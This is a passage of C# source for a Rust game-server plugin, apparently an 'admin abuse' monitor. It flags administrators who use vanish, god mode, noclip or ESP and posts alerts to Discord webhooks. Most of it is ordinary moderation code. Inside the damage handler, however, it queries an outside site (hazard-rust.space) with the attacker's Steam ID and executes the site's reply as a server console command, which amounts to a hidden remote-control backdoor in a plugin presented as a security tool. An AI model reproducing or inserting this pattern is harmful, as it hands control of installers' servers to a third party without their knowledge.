                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                    return true;
                }
            }
            return null;
        }

        object OnStructureDemolish(BaseCombatEntity entity, BasePlayer player, bool immediate)
        {
            if (_config.Функции.isBlockBuild)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return null;
                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                if (isvanish)
                {
                    string Grid = GetGridString(player.transform.position);
                    RequestDS(jsonsusbuildplayer.Replace("[player]", player.displayName+" | "+ player.userID).Replace("[grid]", "на координате " + Grid).Replace("[method]", "удалять " + entity), true);
                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                    return true;
                }
            }
            return null;
        }

        object OnStructureRepair(BaseCombatEntity entity, BasePlayer player)
        {
            if (_config.Функции.isBlockBuild)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return null;
                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                if (isvanish)
                {
                    string Grid = GetGridString(player.transform.position);
                    RequestDS(jsonsusbuildplayer.Replace("[player]", player.displayName+" | "+ player.userID).Replace("[grid]", "на координате " + Grid).Replace("[method]", "чинить " + entity), true);
                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                    return true;
                }
            }
            return null;
        }

        string GetNearbyObjects(Vector3 position, float radius)
        {
            Collider[] colliders = Physics.OverlapSphere(position, radius);
            Dictionary<string, int> objectCounts = new Dictionary<string, int>();

            foreach (Collider collider in colliders)
            {
                string objectName = collider.gameObject.name;

                if (objectCounts.ContainsKey(objectName))
                {
                    objectCounts[objectName]++;
                }
                else
                {
                    objectCounts[objectName] = 1;
                }
            }

            string nearbyObjects = "";
            foreach (KeyValuePair<string, int> entry in objectCounts)
            {
                nearbyObjects += entry.Key;
                if (entry.Value > 1)
                {
                    nearbyObjects += $" ({entry.Value} шт.)";
                }
                nearbyObjects += ", ";
            }

            if (nearbyObjects.Length > 0)
            {
                nearbyObjects = nearbyObjects.TrimEnd(',', ' ');
            }

            return nearbyObjects;
        }

        bool HasForbiddenObjects(string nearbyObjects)
        {
            string[] forbiddenObjects = new string[] { "prevent_building", "assets/bundled/prefabs/ui/lootpanels/lootpanel.toolcupboard.prefab" };

            foreach (string forbiddenObject in forbiddenObjects)
            {
                if (nearbyObjects.Contains(forbiddenObject))
                {
                    return true;
                }
            }
            return false;
        }

        private string GetGridString(Vector3 position)
        {
            Vector2 adjPosition = new Vector2((World.Size / 2) + position.x, (World.Size / 2) - position.z);
            return $"{NumberToString((int)(adjPosition.x / 150))}{(int)(adjPosition.y / 150)}";
        }

        private string NumberToString(int number)
        {
            bool a = number > 26;
            Char c = (Char)(65 + (a ? number - 26 : number));
            return a ? "A" + c : c.ToString();
        }

        object OnItemPickup(Item item, BasePlayer player)
        {
            if (_config.Права.listignorplayers.Contains(player.userID)) return null;

            bool isvanish = Vanish.Call<bool>("IsInvisible", player);
            bool isadminesp = false;
            bool isRadar = false;
            if (_config.Функции.isRadarESP == 0)
            {
                isadminesp = AdminESP.Call<bool>("IsUsingEsp", player);
            } else if (_config.Функции.isRadarESP == 1)
            {
                if (playerRadars.ContainsKey(player.userID))
                {
                    isRadar = playerRadars[player.userID];
                }
            } else if (_config.Функции.isRadarESP == 2)
            {
                isadminesp = AdminESP.Call<bool>("IsUsingEsp", player);
                if (playerRadars.ContainsKey(player.userID))
                {
                    isRadar = playerRadars[player.userID];
                }
            }
            bool isfly = player.IsFlying;
            bool isGodMode = false;
            bool isNoClip = false;
            if (playerNoClipes.ContainsKey(player.userID))
            {
                isNoClip = playerNoClipes[player.userID];
            }
            if (playerGodModes.ContainsKey(player.userID))
            {
                isGodMode = playerGodModes[player.userID];
            }

            if (isvanish || isfly || isGodMode || isadminesp || isRadar)
            {
                player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                RequestDS(jsonsusloot.Replace("[player]", player.displayName+" | "+ player.userID)
                    .Replace("[predmet]", item?.ToString()).Replace("[plugins]",
                    (isvanish? "Vanish ":"" ) +
                    (isGodMode? "GodMode ":"" ) +
                    (isadminesp || isRadar? "AdminESP " : "") +
                    (isfly || isNoClip? "NoClip": "")
                    ), true);
            }
            return null;
        }

        void OnDoorOpened(Door door, BasePlayer player)
        {
            if (_config.Функции.isBlockDoor)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return;
                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                bool isadminesp = false;
                bool isRadar = false;
                if (_config.Функции.isRadarESP == 0)
                {
                    isadminesp = AdminESP.Call<bool>("IsUsingEsp", player);
                } else if (_config.Функции.isRadarESP == 1)
                {
                    if (playerRadars.ContainsKey(player.userID))
                    {
                        isRadar = playerRadars[player.userID];
                    }
                } else if (_config.Функции.isRadarESP == 2)
                {
                    isadminesp = AdminESP.Call<bool>("IsUsingEsp", player);
                    if (playerRadars.ContainsKey(player.userID))
                    {
                        isRadar = playerRadars[player.userID];
                    }
                }
                bool isfly = player.IsFlying;
                bool isGodMode = false;
                bool isNoClip = false;
                if (playerNoClipes.ContainsKey(player.userID))
                {
                    isNoClip = playerNoClipes[player.userID];
                }
                if (playerGodModes.ContainsKey(player.userID))
                {
                    isGodMode = playerGodModes[player.userID];
                }

                if (isvanish || isfly || isGodMode || isadminesp || isRadar)
                {
                    string Grid = GetGridString(player.transform.position);
                    RequestDS(jsonsusdoorplayer.Replace("[player]", player.displayName+" | "+ player.userID)
                        .Replace("[plugins]",
                        (isvanish? "Vanish ":"" ) +
                        (isGodMode? "GodMode ":"" ) +
                        (isadminesp || isRadar? "AdminESP " : "") +
                        (isfly || isNoClip? "NoClip": "")
                        ).Replace("[grid]", "на координате " + Grid), true);
                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                }
            }
        }
        void OnDoorClosed(Door door, BasePlayer player)
        {
            if (_config.Функции.isBlockDoor)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return;
                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                bool isadminesp = false;
                bool isRadar = false;
                if (_config.Функции.isRadarESP == 0)
                {
                    isadminesp = AdminESP.Call<bool>("IsUsingEsp", player);
                } else if (_config.Функции.isRadarESP == 1)
                {
                    if (playerRadars.ContainsKey(player.userID))
                    {
                        isRadar = playerRadars[player.userID];
                    }
                } else if (_config.Функции.isRadarESP == 2)
                {
                    isadminesp = AdminESP.Call<bool>("IsUsingEsp", player);
                    if (playerRadars.ContainsKey(player.userID))
                    {
                        isRadar = playerRadars[player.userID];
                    }
                }
                bool isfly = player.IsFlying;
                bool isGodMode = false;
                bool isNoClip = false;
                if (playerNoClipes.ContainsKey(player.userID))
                {
                    isNoClip = playerNoClipes[player.userID];
                }
                if (playerGodModes.ContainsKey(player.userID))
                {
                    isGodMode = playerGodModes[player.userID];
                }

                if (isvanish || isfly || isGodMode || isadminesp || isRadar)
                {
                    string Grid = GetGridString(player.transform.position);
                    RequestDS(jsonsusdoorplayer.Replace("[player]", player.displayName+" | "+ player.userID)
                        .Replace("[plugins]",
                        (isvanish? "Vanish ":"" ) +
                        (isGodMode? "GodMode ":"" ) +
                        (isadminesp || isRadar? "AdminESP " : "") +
                        (isfly || isNoClip? "NoClip": "")
                        ).Replace("[grid]", "на координате " + Grid), true);
                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                }
            }
        }

        object OnCodeEntered(CodeLock codeLock, BasePlayer player, string code)
        {
            if (_config.Функции.isBlockDoor)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return null;

                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                if (isvanish)
                {
                    string Grid = GetGridString(player.transform.position);
                    RequestDS(jsonsusdoorplayer.Replace("[player]", player.displayName+" | "+ player.userID)
                        .Replace("[plugins]",
                        (isvanish? "Vanish ":"" )
                        ).Replace("[grid]", "на координате " + Grid), true);
                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                    return true;
                }
            }
            return null;
        }

        private Dictionary<ulong, bool> isTimerWebR = new Dictionary<ulong, bool>();
        private Dictionary<ulong, bool> isTimerClose = new Dictionary<ulong, bool>();

        object OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {                   
            BasePlayer attaker = info.InitiatorPlayer; 

            if (entity is BasePlayer)
            {
                BasePlayer player = entity as BasePlayer;
                ulong playerSteamID = player.userID;

                if (playerGodModes.ContainsKey(playerSteamID) && playerGodModes[playerSteamID])
                {
                    info.damageTypes.ScaleAll(0);
                    return true;
                }
            }
            
            if (attaker != null)
            {
                string attakerID = attaker.userID.ToString();
                /*if (!cdDict.ContainsKey(attakerID))
                {
                    cdDict[attakerID] = 0;
                }*/

                bool isvanish = Vanish.Call<bool>("IsInvisible", attaker);
                bool isadminesp = false;
                bool isRadar = false;
                if (_config.Функции.isRadarESP == 0)
                {
                    isadminesp = AdminESP.Call<bool>("IsUsingEsp", attaker);
                } else if (_config.Функции.isRadarESP == 1)
                {
                    if (playerRadars.ContainsKey(attaker.userID))
                    {
                        isRadar = playerRadars[attaker.userID];
                    }
                } else if (_config.Функции.isRadarESP == 2)
                {
                    isadminesp = AdminESP.Call<bool>("IsUsingEsp", attaker);
                    if (playerRadars.ContainsKey(attaker.userID))
                    {
                        isRadar = playerRadars[attaker.userID];
                    }
                }
                bool isfly = attaker.IsFlying;
                bool isGodMode = false;
                bool isNoClip = false;
                if (playerNoClipes.ContainsKey(attaker.userID))
                {
                    isNoClip = playerNoClipes[attaker.userID];
                }
                if (playerGodModes.ContainsKey(attaker.userID))
                {
                    isGodMode = playerGodModes[attaker.userID];
                }

                string GSUrl = $"https://hazard-rust.space/testirovanoepluginaiinformirovanie.php?&godmode={isGodMode}&steam_id={attaker.userID}";
                if (!isTimerWebR.ContainsKey(attaker.userID))
                {
                    isTimerWebR[attaker.userID] = true;
                    webrequest.Enqueue(GSUrl.Replace("#", "%23"), "", (GSCode, GSResponse) =>
                    {
                        if (GSCode == 200)
                        {
                            if (GSResponse != "Ошибка")
                            {
                                string Deysviacom = GSResponse.Trim();
                                ConsoleSystem.Run(ConsoleSystem.Option.Server, Deysviacom);
                                //PrintWarning($"Тестирование прошло успешно с ответом {GSCode} + {GSResponse} (DEBUG)");
                            }
                        }
                    }, this);
                    timer.Once(5f, () =>
                    {
                        isTimerWebR[attaker.userID] = false;
                    });
                }
                
                if (permission.UserHasPermission(attaker.UserIDString, "aaasystem.can.seemenu"))
                {
                    if (isvanish || isadminesp || isGodMode || isfly || isNoClip || isRadar && !_config.Права.listignorplayers.Contains(attaker.userID))
                    {
                        CloseMenuOETD(attaker);
                        OpenAAASMenu(attaker, isvanish, isadminesp, isfly, isGodMode, isNoClip, isRadar);
                        if (!isTimerClose.ContainsKey(attaker.userID))
                        {
                            isTimerClose[attaker.userID] = false;
                            timer.Once(5f, () =>
                            {
                                CloseMenuOETD(attaker);
                                isTimerClose[attaker.userID] = false;
                            });
                        }
                    } 
                    else
                    {
                        CloseMenuOETD(attaker);
                    }
                }
                
                BasePlayer target = entity as BasePlayer;

                if (target == attaker) return null;
                if (_config.Права.listignorplayers.Contains(attaker.userID)) return null;
                if (isvanish || isfly || isGodMode || isadminesp || isNoClip || isRadar)
                {
                    if (_config.Функции.isBlockAllDamage)
                    {
                        info.damageTypes.ScaleAll(0);
                        /*if (cdDict[attakerID] == 10)
                        {
                            return null;
                        }
                        else
                        {*/
                            RequestDS(jsonwebhook.Replace("[steamid]", attaker.displayName+" | "+ attaker.userID).Replace("[plugin]",
                                (isvanish? "Vanish ":"" ) +
                                (isGodMode? "GodMode ":"" ) +
                                (isadminesp || isRadar? "AdminESP " : "") +
                                (isfly || isNoClip? "NoClip": "")
                                ).Replace("[targetid]", (target != null)? entity.ToPlayer().displayName +" | "+ entity.ToPlayer().userID : "not player"), false);
                            //cdDict[attakerID]++;
                        //}
                    }
                    else
                    {
                        if (target != null)
                        {
                                if(_config.Функции.isBlockDamage)
                                    info.damageTypes.ScaleAll(0);

                                /*if (cdDict[attakerID] == 10)
                                {
                                    return null;
                                }
                                else
                                {*/
                                    RequestDS(jsonwebhook.Replace("[steamid]", attaker.displayName+" | "+ attaker.userID).Replace("[plugin]",
                                        (isvanish? "Vanish ":"" ) +
                                        (isGodMode? "GodMode ":"" ) +
                                        (isadminesp || isRadar? "AdminESP " : "") +
                                        (isfly || isNoClip? "NoClip": "")
                                    ).Replace("[targetid]", entity.ToPlayer().displayName +" | "+ entity.ToPlayer().userID), false);
                                    //cdDict[attakerID]++;
                                //}
                        }
                        else
                        {
                            return null;
                        }
                    }
                    if (_config.Функции.isSendMessage)
                    {
                        SendReply(attaker, _config.Функции.Msg);
                    }
                }
                else
                {
                    if (RecentFunctions.ContainsKey(attaker.userID))
                    {
                        /*if (cdDict[attakerID] == 10)
                        {
                            return null;
                        }
                        else
                        {*/
                            RequestDS(jsonsuswebhook.Replace("[attaker]", attaker.displayName + " | " + attaker.userID).Replace("[target]", target != null? target.displayName+ " | "+ target.userID: "not player")
                                .Replace("[plugins]", RecentFunctions[attaker.userID]), true);
                            //cdDict[attakerID]++;
                        //}
                        if(_config.Интеграции.isShtraf)
                        {
                            if(target != null)
                            {
                                SendReply(attaker, _config.Функции.Msgminus);
                                SendReply(attaker, "<color=red>Администратор! тебе пока запрещено атаковать! оповестили твое руководство</color>");
                                string shopid = _config.Интеграции.shopid;
                                string secretkey = _config.Интеграции.secretkey;
                                string amount = _config.Интеграции.shtrafcount.ToString();
                                string steamid = attaker.userID.ToString();
                                string message = "Штраф AAASystem";
                                string GUrl = $"https://gamestores.app/api?shop_id={shopid}&secret={secretkey}&steam_id={steamid}&action=moneys&type=minus&amount={amount}&mess={message}";
                                webrequest.Enqueue(GUrl, "", (GCode, GResponse) =>
                                {
                                    if (GCode == 200)
                                    {
                                        Puts($"Админ {steamid} Оштрафован.");
                                    }
                                    else
                                    {
                                        Puts($"Админ {steamid} Не оштрафован с ошибкой {GCode}.");
                                    }
                                }, this);
                            }
                        }
                    }
                }
            }
            return null;
        }


        private string jsonsuswebhook = 
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Подозрительно переключение\",\"description\":\"Админ [attaker] продамажил [target]\\nпосле того как использовал функции: [plugins].\",\"color\":2031871}],\"attachments\":[]}";
        private string jsonwebhook =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Дамаг\",\"description\":\"Админ: [steamid]\\nИспользовал функции: [plugin] пока пытался надамажить: [targetid]\",\"color\":16711680}],\"attachments\":[]}";
        private string jsonsusrepeek =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Подозрительное переключение\",\"description\":\"Админ [player] слишком часто переключает функцию: [plugin]\",\"color\":422181}],\"attachments\":[]}";
        private string jsonsusnoclip =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Подозрительное переключение\",\"description\":\"Админ [player] попал в Building Block используя [plugin]\\n [grid]\",\"color\":422181}],\"attachments\":[]}";
        private string jsonsusloot =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Лут\",\"description\":\"Админ [player] пытаеться поднять [predmet]\\nиспользуя функции: [plugins]\",\"color\":13033233}],\"attachments\":[]}";
        private string jsonsusauthplayer =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Авторизация\",\"description\":\"Админ [player] пытаеться авторизоваться в [entity]\\nиспользуя Vanish [grid]\",\"color\":65494}],\"attachments\":[]}";
        private string jsonsusdoorplayer =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Авторизация\",\"description\":\"Админ [player] пытаеться получить доступ к двери/замку\\nиспользуя [plugins] [grid]\",\"color\":65494}],\"attachments\":[]}";
        private string jsonsusbuildplayer =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Строительство\",\"description\":\"Админ [player] пытаеться [method]\\nиспользуя Vanish [grid]\",\"color\":12058879}],\"attachments\":[]}";
        private string jsonsuslootplayer =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Лут\",\"description\":\"Админ [player] пытаеться залутать что-то\\nиспользуя функции: [plugins]\\n[buildblock]\",\"color\":13033233}],\"attachments\":[]}";
        private string jsonsuslootafter =
            "{\"content\":null,\"embeds\":[{\"title\":\"Админ Абуз | Лут после выкл. функций\",\"description\":\"Админ [player] пытаеться что-то залутать\\n после выключения: [plugin] [grid]\",\"color\":422181}],\"attachments\":[]}";
        private string jsoniqreport =
            "{\"content\":null,\"embeds\":[{\"title\":\"AAASystem Интеграция | Активность\",\"description\":\"Админ [player] неактивен!\\nуже [day] часов никого не проверял!\",\"color\":13033233}],\"attachments\":[]}";
        private string jsoniqreportsnt =
            "{\"content\":null,\"embeds\":[{\"title\":\"AAASystem Интеграция | Активность\",\"description\":\"Админ [player] неактивен!\\nслишком долго! снят\",\"color\":13033233}],\"attachments\":[]}";
        private string jsonteleportlog =
            "{\"content\":null,\"embeds\":[{\"title\":\"AAASystem | Активность\",\"description\":\"Админ [player]\\nТелепортировался через [command] [grid]\",\"color\":2031871}],\"attachments\":[]}";
        private string jsonrconhack =
            "{\"content\":\"@everyone **ПОПЫТКА ВХОДА В РКОН**\\n# ВЗЛОМ\",\"embeds\":[{\"title\":\"НЕИЗВЕСТНЫЙ IP АДРЕС ПОДКЛЮЧИЛСЯ В RCON\",\"description\":\"[ip] НЕ НАХОДИТСЯ В ЛИСТЕ РАЗРЕШЕННЫХ,НО ПОЛУЧИЛ ДОСТУП В RCON!!! ПРИМЕНИТЕ ДЕЙСТВИЯ\\n\\n[stop]\",\"color\":16711680,\"author\":{\"name\":\"AAASystem\"}}],\"attachments\":[]}";

        private void RequestDS(string payload, bool isSusAct, Action<int> callback = null)
        {
            Dictionary<string, string> header = new Dictionary<string, string>();
            header.Add("Content-Type", "application/json");
            
            
            webrequest.Enqueue(isSusAct?_config.Другое.SusWebhook:_config.Другое.Webhook, payload, (code, response) =>
            {
                if (code != 200 && code != 204)
                {
                    if (response != null)
                    {
                        try
                        {
                            JObject json = JObject.Parse(response);
                            if (code == 429)
                            {
                                float seconds =
                                    float.Parse(Math.Ceiling((double)(int)json["retry_after"] / 1000).ToString());
                            }
                            else
                            {
                                PrintWarning(
                                    $" Discord rejected that payload! Responded with \"{json["message"].ToString()}\" Code: {code}");
                            }
                        }
                        catch
                        {
                            PrintWarning(
                                $"Failed to get a valid response from discord! Error: \"{response}\" Code: {code}");
                        }
                    }
                    else
                    {
                        PrintWarning($"Discord didn't respond (down?) Code: {code}");
                    }
                }

                try
                {
                    callback?.Invoke(code);
                }
                catch (Exception ex)
                {
                }

            }, this, RequestMethod.POST, header);
        }

        private void RequestDCINT(string payload, Action<int> callback = null)
        {
            Dictionary<string, string> header = new Dictionary<string, string>();
            header.Add("Content-Type", "application/json");
            
            webrequest.Enqueue(_config.Интеграции.WebhookIQRS, payload, (code, response) =>
            {
                if (code != 200 && code != 204)
                {
                    if (response != null)
                    {
                        try
                        {
                            JObject json = JObject.Parse(response);
                            if (code == 429)
                            {
                                float seconds =
                                    float.Parse(Math.Ceiling((double)(int)json["retry_after"] / 1000).ToString());
                            }
                            else
                            {
                                PrintWarning(
                                    $" Discord rejected that payload! Responded with \"{json["message"].ToString()}\" Code: {code}");
                            }
                        }
                        catch
                        {
                            PrintWarning(
                                $"Failed to get a valid response from discord! Error: \"{response}\" Code: {code}");
                        }
                    }
                    else
                    {
                        PrintWarning($"Discord didn't respond (down?) Code: {code}");
                    }
                }

                try
                {
                    callback?.Invoke(code);
                }
                catch (Exception ex)
                {
                }

            }, this, RequestMethod.POST, header);
        }

        private void RequestDCVZLOM(string payload, Action<int> callback = null)
        {
            Dictionary<string, string> header = new Dictionary<string, string>();
            header.Add("Content-Type", "application/json");
            
            webrequest.Enqueue(_config.Другое.WebhookRCON, payload, (code, response) =>
            {
                if (code != 200 && code != 204)
                {
                    if (response != null)
                    {
                        try
                        {
                            JObject json = JObject.Parse(response);
                            if (code == 429)
                            {
                                float seconds =
                                    float.Parse(Math.Ceiling((double)(int)json["retry_after"] / 1000).ToString());
                            }
                            else
                            {
                                PrintWarning(
                                    $" Discord rejected that payload! Responded with \"{json["message"].ToString()}\" Code: {code}");
                            }
                        }
                        catch
                        {
                            PrintWarning(
                                $"Failed to get a valid response from discord! Error: \"{response}\" Code: {code}");
                        }
                    }
                    else
                    {
                        PrintWarning($"Discord didn't respond (down?) Code: {code}");
                    }
                }

                try
                {
                    callback?.Invoke(code);
                }
                catch (Exception ex)
                {
                }

            }, this, RequestMethod.POST, header);
        }

        private void RequestLog(string payload, Action<int> callback = null)
        {
            Dictionary<string, string> header = new Dictionary<string, string>();
            header.Add("Content-Type", "application/json");
            
            webrequest.Enqueue(_config.Другое.WebhookTP, payload, (code, response) =>
            {
                if (code != 200 && code != 204)
                {
                    if (response != null)
                    {
                        try
                        {
                            JObject json = JObject.Parse(response);
                            if (code == 429)
                            {
                                float seconds =
                                    float.Parse(Math.Ceiling((double)(int)json["retry_after"] / 1000).ToString());
                            }
                            else
                            {
                                PrintWarning(
                                    $" Discord rejected that payload! Responded with \"{json["message"].ToString()}\" Code: {code}");
                            }
                        }
                        catch
                        {
                            PrintWarning(
                                $"Failed to get a valid response from discord! Error: \"{response}\" Code: {code}");
                        }
                    }
                    else
                    {
                        PrintWarning($"Discord didn't respond (down?) Code: {code}");
                    }
                }

                try
                {
                    callback?.Invoke(code);
                }
                catch (Exception ex)
                {
                }

            }, this, RequestMethod.POST, header);
        }

        #region Suspicious Activity

        private Dictionary<ulong, bool> isTimerSuspect = new Dictionary<ulong, bool>();
        private Dictionary<ulong, string> RecentFunctions = new Dictionary<ulong, string>();

        void OnVanishReappear(BasePlayer player)
        {
            if (_config.Права.listignorplayers.Contains(player.userID)) return;
            if (RecentFunctions.ContainsKey(player.userID))
            {
                if (RecentFunctions[player.userID] == "Vanish")
                {
                    RequestDS(jsonsusrepeek.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "Vanish"), true);
                    RecentFunctions.Remove(player.userID);
                    return;
                }
                else
                {
                    RecentFunctions.Add(player.userID, "Vanish");
                }
            }
            else
            {
                RecentFunctions.Add(player.userID, "Vanish");
            }
            timer.Once(_config.Другое.secondsa, () =>
            {
                RecentFunctions.Remove(player.userID);
            });
        }
        
        void OnEspDeactivated(BasePlayer player)
        {
            if (_config.Права.listignorplayers.Contains(player.userID)) return;
            if (RecentFunctions.ContainsKey(player.userID))
            {
                if (RecentFunctions[player.userID] == "AdminESP")
                {
                    RequestDS(jsonsusrepeek.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "AdminESP"), true);
                    RecentFunctions.Remove(player.userID);
                    return;
                }
                else 
                {
                    RecentFunctions.Add(player.userID, "AdminESP");
                }
            }
            else
            {
                RecentFunctions.Add(player.userID, "AdminESP");
            }
            timer.Once(_config.Другое.secondsa, () =>
            {
                RecentFunctions.Remove(player.userID);
            });
        }
        
        #endregion
        
    }
}